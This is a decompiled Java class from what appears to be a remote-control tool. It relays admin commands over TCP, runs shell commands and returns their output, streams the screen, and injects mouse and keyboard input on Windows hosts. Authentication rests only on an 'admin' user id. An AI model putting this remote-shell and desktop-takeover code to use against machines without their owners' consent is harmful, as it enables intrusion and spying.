/*** Eclipse Class Decompiler plugin, copyright (c) 2016 Chen Chao (cnfree2000@hotmail.com) ***/
package com.mugui.model;

import com.mugui.http.Bean.CMDBean;
import com.mugui.http.Bean.FileBean;
import com.mugui.http.Bean.ImgBean;
import com.mugui.http.Bean.KeyInfoBean;
import com.mugui.http.Bean.MouseInfoBean;
import com.mugui.http.Bean.UserBean;
import com.mugui.http.Bean.WindowListenerBean;
import com.mugui.http.DataSave;
import com.mugui.http.pack.TcpBag;
import com.mugui.http.tcp.TcpSocketUserBean;
import com.mugui.tool.CMD;
import com.mugui.tool.Other;
import com.mugui.windows.Tool;
import com.mugui.windows.WindowControlThread;

import java.awt.Dimension;
import java.awt.event.KeyEvent;
import java.util.Iterator;

import net.sf.json.JSONArray;
import net.sf.json.JSONObject;

public class HsListentModel extends TCPModel {
	public static final int LIUNX = 1;
	public static final int WINDOWS = 2;
	public static int SYSTEM_OS = -1;
	private static CMD cmd;
	private static Thread thread;
	private static Dimension WINDOW_SIZE;

	static {
		String os = System.getProperties().getProperty("os.name");
		if ((!(os.startsWith("win"))) && (!(os.startsWith("Win"))))
			SYSTEM_OS = 1;
		else {
			SYSTEM_OS = 2;
		}

		cmd = null;
		thread = null;

		WINDOW_SIZE = null;
	}

	public static void getUserList(TcpBag bag, TcpSocketUserBean tcpSocket) {
		updateMAIN_TCP(tcpSocket);
		Iterator maillist = DataSave.getUserAll();
		JSONArray jsonArray = new JSONArray();
		if (maillist == null) {
			bag.setBody(jsonArray);
			tcpSocket.sendCompact(bag);
			return;
		}
		do {
			UserBean userBean = new UserBean();
			userBean.setUser_mail((String) maillist.next());
			jsonArray.add(userBean.toJsonObject());
		} while (maillist.hasNext());

		bag.setBody(jsonArray);
		tcpSocket.sendCompact(bag);
	}

	public static void sendCMD(TcpBag bag, TcpSocketUserBean tcpSocket) {
		TcpSocketUserBean main_tcp = updateMAIN_TCP(tcpSocket);
		CMDBean cmdBean = new CMDBean((JSONObject) bag.getBody());
		if (cmdBean.getUser_id().equals("admin")) {
			cmdInfo(bag, tcpSocket);
			return;
		}
		TcpSocketUserBean tcpSocket2 = DataSave.getTcpSocket(cmdBean.getUser_id());
		if ((tcpSocket2 == null) || (!(tcpSocket2.isSocketRun()))) {
			cmdBean.setUser_text("用户不在线!");
			bag.setBody(cmdBean.toJsonObject());
			bag.setBag_id("admin_cmd_info");
			sendBean(bag, main_tcp);
			return;
		}
		sendBean(bag, tcpSocket2);
	}

	private static TcpSocketUserBean updateMAIN_TCP(TcpSocketUserBean tcpSocket) {
		TcpSocketUserBean main_tcp = DataSave.getTcpSocket("admin");
		if ((main_tcp == null) || main_tcp != tcpSocket) {
			DataSave.addTcpSocket("admin", tcpSocket);
			main_tcp = tcpSocket;
		}
		return main_tcp;
	}

	private static void cmdInfo(TcpBag bag, TcpSocketUserBean tcpSocket) {
		if ((cmd == null) || (!(cmd.isColose()))) {
			if (cmd == null)
				cmd = new CMD();
			cmd.start();
			thread = new Thread(new Runnable() {
				public void run() {
					while (HsListentModel.cmd.isColose()) {
						Other.sleep(20);
						if ((HsListentModel.cmd.getInfo() != null) && (!(HsListentModel.cmd.getInfo().equals("")))) {
							Other.sleep(20);
							CMDBean cmdBean = new CMDBean();
							cmdBean.setUser_text(HsListentModel.cmd.getInfo());
							HsListentModel.cmd.reInfo();
							TcpBag tcpBag = new TcpBag();
							tcpBag.setBody(cmdBean.toJsonObject());
							tcpBag.setBag_id("admin_cmd_info");
							TcpSocketUserBean tcpSocket = DataSave.getTcpSocket("admin");
							if ((tcpSocket != null) && (tcpSocket.isSocketRun())) {
								sendBean(tcpBag, tcpSocket);
							} else {
								HsListentModel.cmd.close();
								return;
							}
						}
					}
				}
			});
			thread.start();
		}
		CMDBean cmdBean = new CMDBean((JSONObject) bag.getBody());
		cmd.send(cmdBean.getUser_text());
	}

	public static void reCmdInfo(TcpBag bag, TcpSocketUserBean tcpSocket) {
		TcpSocketUserBean tcpSocket2 = DataSave.getTcpSocket("admin");
		if ((tcpSocket2 != null) && (tcpSocket2.isSocketRun()))
			sendBean(bag, tcpSocket2);
	}

	public static void userWindowsImg(TcpBag bag, TcpSocketUserBean tcpSocket) {
		WindowListenerBean bean = WindowListenerBean.newInstanceBean(WindowListenerBean.class, bag.getBody_description());
		TcpSocketUserBean tcpSocket2 = null;
		if (bean.getUser_mail() == null) {
			tcpSocket2 = DataSave.getTcpSocket("admin");
		} else
			tcpSocket2 = DataSave.getTcpSocket(bean.getTo_user_mail());
		if ((tcpSocket2 != null) && (tcpSocket2.isSocketRun())) {
			tcpSocket2.sendByteArray(bag);
		} else {
			System.out.println(bean);
			TcpBag tcpBag = new TcpBag();
			tcpBag.setBag_id("stop_user_window");
			WindowListenerBean imgBean = new WindowListenerBean();
			imgBean.setMark(bean.getMark());
			tcpBag.setBody(imgBean.toJsonObject());
			tcpSocket.sendCompact(tcpBag);
		}
	}

	public static void getUserWindows(TcpBag bag, TcpSocketUserBean tcpSocket) {
		updateMAIN_TCP(tcpSocket);
		WindowListenerBean userBean = new WindowListenerBean((JSONObject) bag.getBody());
		if (userBean.getTo_user_mail().equals("admin")) {
			ListenerWindows(bag, tcpSocket);
			return;
		}
		
		TcpSocketUserBean tcpSocket2 = DataSave.getTcpSocket(userBean.getTo_user_mail());
		if ((tcpSocket2 == null) || (!(tcpSocket2.isSocketRun()))) {
			return;
		}
		sendBean(bag, tcpSocket2);
	}

	public static void stopUserWindow(TcpBag bag, TcpSocketUserBean tcpSocket) {
		WindowListenerBean imgbean = new WindowListenerBean((JSONObject) bag.getBody());
		if (imgbean.getUser_mail().equals("admin")) {
			WindowControlThread.stop(bag, tcpSocket);
			return;
		}
		TcpSocketUserBean tcpSocket2 = DataSave.getTcpSocket(imgbean.getUser_mail());
		if ((tcpSocket2 == null) || (!(tcpSocket2.isSocketRun()))) {
			return;
		}
		sendBean(bag, tcpSocket2);
	}

	private static final double nsn = 1.0;
	private static final double WIDTH = 1920 * nsn;
	private static final double HEIGHT = 1080 * nsn;

	private static void ListenerWindows(final TcpBag bag, final TcpSocketUserBean tcpSocket) {
		if (SYSTEM_OS == 2) {
			WindowControlThread.start(bag, tcpSocket);
		}
	}

	public static void mouseInfo(TcpBag bag, TcpSocketUserBean tcpSocket) {
		// TcpSocketUserBean main_tcp = updateMAIN_TCP(tcpSocket);
		MouseInfoBean mouseInfoBean = new MouseInfoBean((JSONObject) bag.getBody());
		if (mouseInfoBean.getMail().equals("admin")) {
			mousehandle(bag, tcpSocket);
			return;
		}
		TcpSocketUserBean tcpSocket2 = DataSave.getTcpSocket(mouseInfoBean.getMail());
		if ((tcpSocket2 == null) || (!(tcpSocket2.isSocketRun()))) {
			return;
		}
		sendBean(bag, tcpSocket2);
	}

	private static Tool tool = null;

	private static void mousehandle(TcpBag bag, TcpSocketUserBean tcpSocket) {
		if (SYSTEM_OS == 2) {
			if (tool == null)
				tool = new Tool();
			MouseInfoBean bean = new MouseInfoBean((JSONObject) bag.getBody());
			if (bean.getX() > 0 && bean.getY() > 0 && bean.getX() < WINDOW_SIZE.width && bean.getY() < WINDOW_SIZE.height)
				;
			else {
				return;
			}
			double dw = WINDOW_SIZE.width > WIDTH ? WIDTH / WINDOW_SIZE.width : 1;
			double dh = WINDOW_SIZE.height > HEIGHT ? HEIGHT / WINDOW_SIZE.height : 1;
			tool.mouseMove((int) (bean.getX() / dw), (int) (bean.getY() / dh));
			if (bean.getChick() == 0) {
				tool.mouseRelease(bean.getButton());
			} else if (bean.getChick() == 1) {
				tool.mousePress(bean.getButton());
			}

		}
	}

	public static void keyInfo(TcpBag bag, TcpSocketUserBean tcpSocket) {
		// TcpSocketUserBean main_tcp = updateMAIN_TCP(tcpSocket);
		KeyInfoBean mouseInfoBean = new KeyInfoBean((JSONObject) bag.getBody());
		if (mouseInfoBean.getMail().equals("admin")) {
			keyhandle(bag, tcpSocket);
			return;
		}
		TcpSocketUserBean tcpSocket2 = DataSave.getTcpSocket(mouseInfoBean.getMail());
		if ((tcpSocket2 == null) || (!(tcpSocket2.isSocketRun()))) {
			return;
		}
		sendBean(bag, tcpSocket2);
	}

	private static void keyhandle(TcpBag bag, TcpSocketUserBean tcpSocket) {
		if (SYSTEM_OS == 2) {
			if (tool == null)
				tool = new Tool();
			KeyInfoBean bean = new KeyInfoBean((JSONObject) bag.getBody());
			if (KeyEvent.getKeyText(bean.getKey()) == null)
				return;
			if (bean.getChick() == 0) {
				tool.keyRelease(bean.getKey());
			} else if (bean.getChick() == 1) {
				tool.keyPress(bean.getKey());
			}
		}
	}
}